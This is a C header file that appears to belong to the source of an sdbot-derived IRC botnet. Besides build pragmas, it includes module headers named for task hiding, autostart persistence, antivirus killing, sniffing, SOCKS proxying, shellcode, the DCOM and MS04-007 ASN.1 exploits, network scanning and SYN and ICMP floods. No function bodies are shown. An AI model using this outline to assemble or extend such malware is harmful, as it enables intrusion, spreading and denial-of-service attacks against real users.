#pragma comment(lib, "libcd.lib") 
#pragma comment(lib, "ws2_32.lib") 
#ifdef WIN32 
#define _WIN32_WINNT    0x0403                // Very important for critical sections. 
#define WIN32_LEAN_AND_MEAN                    // Good to use. 
#pragma optimize("gsy", on)                    // Global optimization, Short sequences, Frame pointers. 
#pragma comment(linker,"/RELEASE")            // Release code 
#pragma comment(linker, "/ALIGN:4096")        // This will save you some size on the executable. 
#pragma comment(linker, "/IGNORE:4108 ")    // This is only here for when you use /ALIGN:4096. 
//#pragma pack(1)                                // Force packing on byte boundaries. 
#endif // WIN32 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>
#include <time.h>
#include <Lm.h>
#include <winioctl.h>
#include <shlwapi.h>
#include <Winnetwk.h>
#include <ctype.h>
#include <lmat.h>
#include <lmremutl.h>
#include <psapi.h>
#include <process.h>
#include <winsvc.h>
#include <stdarg.h>
#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>


#include "Defines.h"
#include "driveinfo.h"
#include "sdbot05b.h"
#include "taskhider.h"
#include "threads.h"
#include "net.h"
#include "netutils.h"
#include "rndnick.h"
#include "loaddll.h"
#include "autostart.h"
#include "secure.h"
#include "visit.h"
#include "download.h"
#include "tcpip.h"
#include "hostauth.h"
#include "ftpd.h"
#include "advscan.h"
#include "misc.h"
#include "aliaslog.h"
#include "fphost.h"
#include "shellcode.h"
#include "tftpd.h"
#include "irc_send.h"
#include "sniffer.h"
#include "socks.h"
#include "avirus.h"
#include "processes.h"
#include "dcom.h"
#include "ms04_007_asn1.h"
#include "vnc.h"
#include "netapi.h"
#include "synflood.h"
#include "icmpflood.h"
#include "httpd.h"
